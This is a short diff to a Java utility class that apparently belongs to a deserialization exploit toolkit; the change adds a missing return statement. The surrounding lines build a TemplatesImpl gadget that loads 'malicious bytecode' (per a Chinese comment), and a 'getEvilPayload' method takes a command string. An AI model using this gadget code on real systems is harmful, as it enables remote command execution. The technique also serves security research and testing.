@@ -50,6 +50,8 @@ public class Utils {
         // 这里的恶意字节码 必须要使用存在的类 ，不能使用 makeClass 生成的；
         setValue(templates,"_bytecodes",new byte[][]{bytes});
         setValue(templates,"_tfactory",new TransformerFactoryImpl());
+
+        return templates;
     }
 
     public static byte[] getEvilPayload(String cmd) throws Exception {
